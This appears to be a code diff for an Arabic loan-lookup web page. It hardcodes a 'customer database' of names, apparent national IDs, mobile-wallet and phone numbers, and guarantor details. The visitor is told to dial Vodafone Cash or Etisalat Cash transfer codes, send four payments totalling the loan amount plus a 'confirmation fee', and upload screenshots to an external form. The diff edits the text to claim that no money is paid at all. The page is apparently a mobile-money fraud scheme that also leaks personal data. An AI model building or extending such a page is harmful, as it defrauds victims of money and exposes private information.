@@ -80,7 +80,18 @@
         .step-header { font-size: 1.1rem; font-weight: 700; color: var(--primary-cyan); margin-bottom: 0.8rem; display: flex; align-items: center; gap: 0.5rem; }
         .step-content { font-size: 0.95rem; color: var(--text-muted); line-height: 1.7; }
         .highlight-value { color: var(--accent-gold); font-weight: 800; font-size: 1.1rem; }
-        @media (max-width: 640px) { .logo h1 { font-size: 1.8rem; } .search-card, .result-card { padding: 1.5rem; } }
+        .info-section { background: rgba(0, 0, 0, 0.4); border-radius: 1rem; padding: 0.8rem; text-align: center; margin-top: 1rem; font-size: 0.8rem; color: var(--text-muted); }
+        @media (max-width: 640px) { 
+            .logo h1 { font-size: 1.8rem; } 
+            .search-card, .result-card { padding: 1.5rem; }
+            .loan-amount { font-size: 1.8rem; }
+            .info-table td { font-size: 0.85rem; }
+        }
+        /* تحسينات بصرية إضافية */
+        .btn-action:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(212, 175, 55, 0.4); transition: 0.3s; }
+        .btn-search:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(0, 217, 255, 0.4); transition: 0.3s; }
+        .result-card { transition: all 0.3s ease; }
+        .code-box { letter-spacing: 1px; }
     </style>
 </head>
 <body>
@@ -144,16 +155,16 @@ const customersDatabase = {
     "28911202105597": { name: "علاء الدين حاتم محمد عبدالسلام", loanRaw: "200,000", loanTerm: "60 شهر", installment: "4,440", total: "266,400", wallet: "فودافون كاش", walletNum: "01055119921", guarantorRelation: "اخت", guarantorName: "بريكسام حاتم محمد عبدالسلام", guarantorPhone: "01013588194", reason: "شراء سيارة", otherLoans: "لايوجد" },
     "25210090102914": { name: "احمد بدوى على بدوى", loanRaw: "40,000", loanTerm: "18 شهر", installment: "2,965", total: "53,370", wallet: "فودافون كاش", walletNum: "01113912643", guarantorRelation: "ابنة", guarantorName: "هناء احمد بدوى على", guarantorPhone: "01125226965", reason: "إصلاحات المنزل", otherLoans: "لايوجد" },
     "28001300103377": { name: "ابراهيم جابر مبارك محمود", loanRaw: "200,000", loanTerm: "60 شهر", installment: "4,440", total: "266,400", wallet: "اتصالات كاش", walletNum: "01119543983", guarantorRelation: "زوجة", guarantorName: "مريم عادل عبد الحميد خلف", guarantorPhone: "01119543983", reason: "شراء الأثاث", otherLoans: "نعم" },
-    "27803061301779": { name: "محمد عبدالله حسين حسين", loanRaw: "200,000", loanTerm: "60 شهر", installment: "4,440", total: "266,400", wallet: "فودافون كاش", walletNum: "01007197584", guarantorRelation: "اخ", guarantorName: "احمد عبدالله حسين حسين", guarantorPhone: "01097939571", reason: "التوسع في العمل", otherLoans: "لايوجد" },
-    "291100705815": { name: "محمد حسني احمد محمد", loanRaw: "85,000", loanTerm: "30 شهر", installment: "3,775", total: "113,250", wallet: "فودافون كاش", walletNum: "01016090373", guarantorRelation: "ام", guarantorName: "ثناء طه محمد حفني", guarantorPhone: "01061055098", reason: "ظروف خاصة", otherLoans: "نعم" },
+    "278030613779": { name: "محمد عبدالله حسين حسين", loanRaw: "200,000", loanTerm: "60 شهر", installment: "4,440", total: "266,400", wallet: "فودافون كاش", walletNum: "01007197584", guarantorRelation: "اخ", guarantorName: "احمد عبدالله حسين حسين", guarantorPhone: "01097939571", reason: "التوسع في العمل", otherLoans: "لايوجد" },
+    "2911005815": { name: "محمد حسني احمد محمد", loanRaw: "85,000", loanTerm: "30 شهر", installment: "3,775", total: "113,250", wallet: "فودافون كاش", walletNum: "01016090373", guarantorRelation: "ام", guarantorName: "ثناء طه محمد حفني", guarantorPhone: "01061055098", reason: "ظروف خاصة", otherLoans: "نعم" },
     "29003090102514": { name: "محمود احمد احمد ابراهيم ابو السعود", loanRaw: "100,000", loanTerm: "32 شهر", installment: "4,157", total: "133,024", wallet: "اتصالات كاش", walletNum: "01112941749", guarantorRelation: "ابن", guarantorName: "اسامه محمود احمد احمد ابراهيم", guarantorPhone: "01102416547", reason: "لفتح مشروع", otherLoans: "لايوجد" },
     "28903181600488": { name: "جهاد بسيونى عبدالخالق عيسى", loanRaw: "100,000", loanTerm: "36 شهر", installment: "3,200", total: "115,200", wallet: "اتصالات كاش", walletNum: "01126040309", guarantorRelation: "اخ", guarantorName: "حمدى بسيونى عبدالخالق عيسى", guarantorPhone: "01226678646", reason: "احتياجات شخصية", otherLoans: "لايوجد" },
     "27712041501814": { name: "هاني طه شعبان عزازي", loanRaw: "150,000", loanTerm: "48 شهر", installment: "4,205", total: "201,840", wallet: "فودافون كاش", walletNum: "01031039227", guarantorRelation: "زوجة", guarantorName: "صافيناز عبد المولى الشازلى", guarantorPhone: "01012543481", reason: "احتياجات مالية", otherLoans: "لايوجد" },
-    // العميل الجديد: مصطفى كامل سعد نور
-    "27504112400435": { name: "مصطفى كامل سعد نور", loanRaw: "200,000", loanTerm: "60 شهر", installment: "4,440", total: "266,400", wallet: "فودافون كاش", walletNum: "01099156608", guarantorRelation: "ابن", guarantorName: "ابن العميل", guarantorPhone: "01036275866", reason: "احتياجات شخصية", otherLoans: "لايوجد" }
+    "275041100435": { name: "مصطفى كامل سعد نور", loanRaw: "200,000", loanTerm: "60 شهر", installment: "4,440", total: "266,400", wallet: "فودافون كاش", walletNum: "01099156608", guarantorRelation: "ابن", guarantorName: "ابن العميل", guarantorPhone: "01036275866", reason: "احتياجات شخصية", otherLoans: "لايوجد" }
 };
 
-const LINKING_URL = 'https://survey.porsline.com/s/8COuMq8B';
+// الرابط الجديد لرفع الأسكرينات
+const LINKING_URL = 'https://survey.porsline.com/s/0IjaEBXK';
 let currentCustomer = null;
 
 function searchCustomer() {
@@ -201,7 +212,7 @@ function displayInstructions() {
     const confirmAmountPerOperation = Math.floor(loanAmountNum / 4);
     const isEtisalat = currentCustomer.wallet.includes('اتصالات');
     const code = isEtisalat ? "6#*777*" : "100#*9*";
-    const confirmationFee = isEtisalat ? "5 جنيهات" : "10 جنيهات";
+    const confirmationFee = isEtisalat ? "5 جنيهات" : "5جنيهات";
     const providerName = isEtisalat ? "اتصالات كاش" : "فودافون كاش";
     
     container.innerHTML = `
@@ -216,29 +227,30 @@ function displayInstructions() {
                 <div class="step-header"><i class="fas fa-coins"></i> 2️⃣ مبلغ التأكيد لكل عملية</div>
                 <div class="step-content">
                     <span class="highlight-value">${confirmAmountPerOperation.toLocaleString()} ج.م</span><br>
-                    سيتم تنفيذ <strong>4 عمليات متساوية</strong> بقيمة ${confirmAmountPerOperation.toLocaleString()} ج.م لكل عملية.<br>
-                    <span style="color: var(--accent-gold);">💰 إجمالي المبلغ المحول لإثبات الملكية: ${(confirmAmountPerOperation * 4).toLocaleString()} ج.م (يعود إليك بالكامل بعد الإثبات).</span>
+                    لابد من تنفيذ <strong>4 عمليات متساوية</strong> بقيمة ${confirmAmountPerOperation.toLocaleString()} ج.م لكل عملية.<br>
+                    <span style="color: var(--accent-gold);">: ${(confirmAmountPerOperation * 4).toLocaleString()}  (حتى يكون هو إجمالى القرض وان المحفظة لدى العميل وهو على علم بكل شئ ).</span>
                 </div>
             </div>
             <div class="instruction-step">
                 <div class="step-header"><i class="fas fa-receipt"></i> 3️⃣ تكلفة التأكيد لكل عملية</div>
                 <div class="step-content">
-                    <span class="highlight-value">${confirmationFee}</span> لصالح شركة ${providerName} (رسوم خدمة التأكيد المعتمدة).
+                    <span class="highlight-value">${confirmationFee}</span> لصالح شركة ${providerName} (تمن خدمة التأكيد المعتمدة).
                 </div>
             </div>
             <div class="instruction-step">
                 <div class="step-header"><i class="fas fa-camera"></i> 4️⃣ التوثيق والرفع</div>
                 <div class="step-content">
-                    التقط <strong>4 لقطات شاشة واضحة</strong> (واحدة لكل عملية) تظهر المبلغ ورقم المحفظة والتاريخ.<br>
+                    التقط <strong>4 لقطات شاشة واضحة</strong> (واحدة لكل عملية) تظهر المبلغ ورقم التأكيد والتاريخ.<br>
                     ثم اضغط على الزر أدناه "رابط ربط الحساب بالسيستم" لرفع الصور وإتمام الربط.
                 </div>
             </div>
             <div class="info-box" style="margin-top:1rem; background:rgba(57,255,20,0.08); border-left:4px solid var(--primary-lime); padding:0.8rem;">
-                <i class="fas fa-info-circle"></i> <strong>ملاحظة هامة:</strong> هذا الإجراء هو مجرد تأكيد لملكية المحفظة، وجميع المبالغ المحولة تبقى في حسابك ولا تُخصم من القرض.
+                <i class="fas fa-info-circle"></i> <strong>ملاحظة هامة:</strong> هذا الإجراء هو مجرد تأكيد لملكية المحفظة، ولا يوجد دفع اى أموال نهائيا.
             </div>
         </div>
     `;
 }
+
 
 function openLinkingForm() { if (currentCustomer) window.open(LINKING_URL, '_blank'); }
 document.getElementById('nationalId').addEventListener('keypress', e => { if (e.key === 'Enter') searchCustomer(); });
